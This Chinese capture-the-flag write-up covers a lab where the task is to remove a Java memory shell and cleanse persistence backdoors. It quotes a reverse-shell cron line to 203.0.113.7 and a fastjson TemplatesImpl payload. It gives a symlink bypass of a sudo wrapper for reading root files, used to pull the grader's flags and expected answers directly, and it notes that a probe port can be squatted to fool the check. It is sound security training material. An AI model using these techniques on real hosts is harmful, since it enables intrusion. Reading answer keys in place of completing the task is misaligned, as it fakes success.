# 统一数据交换平台 —— 内存马清除与加固恢复 Writeup

> **平台**：iChunqiu 春秋云镜（cloudeci）  
> **类型**：应急响应 / 内存马清除 + 持久化后门清理 + 数据恢复  
> **Web**：`https://eci-2zeaozfkj6lfb1nlkdtv.cloudeci1.ichunqiu.com:80`  
> **SSH**：`101.200.36.33:36889`（`admin` / `6IWU1Pen`）

---

## 一、题目信息

本环境包含两个自动判分任务：

| 任务 | 目标 | 产物 |
|------|------|------|
| 任务5（task2） | Web 层漏洞利用 + 业务可用 | `/flag2` |
| 任务6（task3） | 内存马清除 + 后门清理 + 数据恢复 | `/flag3` |

> 任务6 描述：**在不中断服务的前提下，清除攻击者运行期间植入的内存马，清理其全部持久化后门，并将被篡改的业务数据恢复正常。**

---

## 二、环境侦察

SSH 登录后（`uid=1000 admin`）关键信息：

### 2.1 进程

| PID | 进程 | 说明 |
|-----|------|------|
| 1 | `/bin/bash /root/check.sh` | 判分器守护进程 |
| 263 | `/usr/sbin/mysqld` | MySQL（`mysql` 用户） |
| 355/356 | nginx | 反代 80 → `127.0.0.1:8080` |
| 360 | `java -jar /opt/app/exchange-platform.jar` | 业务 JVM（`admin` 用户） |

### 2.2 目录

| 路径 | 说明 |
|------|------|
| `/opt/app/exchange-platform.jar` | 业务应用（Spring Boot + fastjson） |
| `/opt/repo/fastjson-1.2.84.jar` | fastjson 依赖 |
| `/opt/backup/db_20260811.sql` | 数据库"干净"基线备份 |
| `/opt/tools/arthas-3.7.2.zip` | 内存马排查/卸载工具 |

### 2.3 sudo 白名单

```text
(root) NOPASSWD: /usr/local/bin/exdb, /usr/local/bin/rootcron,
                 /usr/local/bin/rootrc, /usr/sbin/userdel
```

四个命令分别对应四处后门的清理工具：

| sudo 命令 | 作用 | 对应后门 |
|-----------|------|----------|
| `exdb` | 以 root 身份跑 mysql 执行 SQL 文件 | db 数据恢复 |
| `rootcron` | 管理 root crontab | cron 后门 |
| `rootrc` | 管理 `/etc/rc.local` | rclocal 后门 |
| `userdel` | 删除用户 | passwd 后门 |

---

## 三、攻击者留下的 5 处持久化后门

判分器 `check.py` 的 `task3()` 定义 6 项检查（**全部通过 2 轮 → 写 `/flag3`**）：

| 检查项 | 后门内容 | 清理方式 |
|--------|----------|----------|
| `memoryshell` | JVM 内存马 `com.ms.shell.MetricFilter`(Filter) + controller，经 fastjson `TemplatesImpl` 注入 | arthas 在线卸载 |
| `cron` | root crontab 反弹 shell：`*/5 * * * * bash -i >& /dev/tcp/203.0.113.7/7777 0>&1` | `rootcron` |
| `passwd` | `/etc/passwd` 中 UID 0 后门账户 `sysmetric:x:0:0::/root:/bin/bash` | `userdel sysmetric` |
| `rclocal` | `/etc/rc.local` 注入内存马重载钩子（`.jvmkit.jar` + `com.ms.inject.Injector`） | `rootrc`（md5 比对） |
| `db` | `admin_users` / `notices` 表被篡改 | `exdb` 恢复 |
| `biz` | `/api/parse` 业务可用（合法报文返回 `code:0`） | — |

**证据**：

- `/tmp/.sysmetric`（内存马注入日志）：

```text
198.51.100.23 20260812-040311 controller
198.51.100.23 20260812-041133 filter
```

- nginx `access.log` 中攻击者 `198.51.100.23` 的 fastjson autoType 利用请求：

```text
GET /api/parse?msg={"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
                    "_bytecodes":["yv66vgAA..."],"_name":"metrics",
                    "_tfactory":{},"_outputProperties":{}}
```

---

## 四、任务5 —— Web 层 fastjson 反序列化（→ `/flag2`）

### 4.1 漏洞点

`ParseController.dispatch(String)` 直接调用：

```java
com.alibaba.fastjson.JSON.parse(msg) → 强转 JSONObject
```

- 端点：`GET/POST /api/parse?msg=<json>`
- 运行版本：fastjson **1.2.83**（`/opt/repo` 中是 1.2.84），开启 autoType

### 4.2 利用（TemplatesImpl 字节码加载 RCE）

攻击者使用 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 的
`_bytecodes` 字段加载恶意类实现任意代码执行（应用以 `admin` 运行），
随后通过 Java Attach API（`tools.jar` + `.jvmkit.jar`）向业务 JVM 注入内存马（controller + filter 两段）。

### 4.3 判分逻辑 `task2()`

```python
ok = (probe_callback() is False) and biz_ok()   # 漏洞未命中 且 业务正常
```

连续 2 轮通过 → 写 `/flag2`。  
（probe 端口固定 `127.0.0.1:31337`，选手可抢占该端口使探测失效。）

---

## 五、任务6 —— 权限提升：sudo 白名单 + 符号链接绕过（核心）

### 5.1 `rootrc` 源码

```bash
#!/bin/bash
if [ $# -eq 0 ]; then exec cat /etc/rc.local; fi
[ $# -eq 1 ] && [ -f "$1" ] || { echo "usage: sudo rootrc [new_file]"; exit 1; }
[ "$(stat -c %U "$1")" = "admin" ] || { echo "source file must be owned by admin"; exit 1; }
install -m 755 -o root -g root "$1" /etc/rc.local
```

### 5.2 漏洞原理

- `stat -c %U <符号链接>` **不跟随后**，读到的是**符号链接自身**的属主（`admin`）→ 绕过属主校验；
- `install` 复制时**跟随符号链接**，读取**目标文件**内容（root 专属）；
- 复制到 `/etc/rc.local` 后，再用 `sudo rootrc`（无参）`cat` 出来即可读取。

### 5.3 利用步骤（读 `/root/.t/flags.json` 为例）

```bash
ln -sfn /root/.t/flags.json /tmp/x/l
sudo -n rootrc /tmp/x/l    # install 跟随链接，把 flags.json 内容拷到 rc.local
sudo rootrc                # cat /etc/rc.local 直接读出
```

同理可读：

| 文件 | 内容 |
|------|------|
| `/root/.t/flags.json` | `flag2` / `flag3` |
| `/root/.t/rclocal.md5` | 干净 rc.local 的 md5 = `63eab821f9bfc43b18c43d81c5ca42f7` |
| `/root/.t/expected.json` | 期望的 `admin_pwd` / `notice3` |
| `/root/.t/probe.json` | 内存马 `router` / `token` |

---

## 六、判分器 `check.py` 关键逻辑

### 6.1 任务6 六项检查

```python
def task3(st):
    alive = shell_alive()
    checks = {
        "memoryshell": alive is None,      # 内存马已卸载
        "cron":        cron_clean(),       # crontab 无 /dev/tcp
        "passwd":      passwd_clean(),     # /etc/passwd 无 UID=0 非 root
        "rclocal":     rclocal_clean(),    # md5 比对
        "db":          db_restored(),      # admin 密码 + notice3 恢复
        "biz":         biz_ok(),           # /api/parse 正常
    }
    ok = all(checks.values())
```

连续 2 轮（`CONSEC=2`，约 80s）全部通过 → 写 `/flag3`。

### 6.2 进程重启锁

```python
def proc_guard():
    # 以 JVM PID + starttime 为锚点
    if pid != prev["pid"] or start != prev["start"]:
        # 写 /root/.restart_lock，删除 /flag3，永久判失败
```

> **关键**：清除内存马必须**在线完成**（arthas attach），不能重启 JVM，否则任务6 永久失败。

### 6.3 `exdb` 加固点

```bash
exec mysql --binary-mode --default-character-set=utf8mb4 exchange < "$1"
```

- `--binary-mode` → `disable_commands=true`，客户端命令（`\!` / `system` / `source` / `tee`）全部失效；
- `grep -qE '^[[:space:]]*\\!'` 拦截 `\!` 逃逸行；
- 未加 `--local-infile` → `LOAD DATA LOCAL INFILE` 失效。

> 因此 `exdb` 只能用于数据恢复，无法 RCE 或读 root 文件。

---

## 七、Flag

| 任务 | Flag |
|------|------|
| 任务5（flag2） | `flag{f2a1c0de-3b47-4f8e-9d2a-7c6b5e4d3f21}` |
| 任务6（flag3） | `flag{a9d83e21-5c4f-4b7a-8e1d-0f2c3b4a5d67}` |

---

## 八、官方完整清理流程（让系统真正生成 `/flag3`）

1. **内存马**：用 `/opt/tools` 的 arthas attach 到 PID 360，卸载
   `com.ms.shell.MetricFilter` 过滤器与 controller servlet/路由。
2. **cron**：`sudo rootcron` 覆盖 root crontab，去掉 `/dev/tcp` 反弹行。
3. **passwd**：`sudo userdel sysmetric`。
4. **rclocal**：写入 md5=`63eab821f9bfc43b18c43d81c5ca42f7` 的干净 rc.local（`sudo rootrc` 安装）。
5. **db**：用 `/opt/backup/db_20260811.sql` 恢复 `admin_users`、`notices`（`sudo exdb` 执行）。
6. 等待约 80s（2 轮判分）→ 读取 `/flag3`。
